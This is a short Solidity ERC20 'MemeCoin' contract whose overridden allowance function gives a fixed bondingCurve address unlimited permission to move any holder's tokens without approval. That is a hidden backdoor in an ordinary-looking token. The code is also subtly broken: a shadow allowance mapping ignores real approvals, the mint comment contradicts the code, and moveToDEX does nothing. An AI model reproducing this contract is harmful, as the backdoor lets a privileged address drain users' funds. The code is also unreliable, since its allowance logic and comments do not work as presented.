// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract MemeCoin is ERC20, Ownable {
    mapping(address account => mapping(address spender => uint256)) private _allowances;
    address public immutable bondingCurve;

    constructor(string memory name_, string memory symbol_, address _bondingCurve) ERC20(name_, symbol_) Ownable(msg.sender) {
        _mint(msg.sender, 7e26); // 700 million tokens to curve
        bondingCurve = _bondingCurve;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        if (spender == bondingCurve) {
            return type(uint256).max;
        }
        return _allowances[_owner][spender];
    }

    function moveToDEX() public onlyOwner {}
}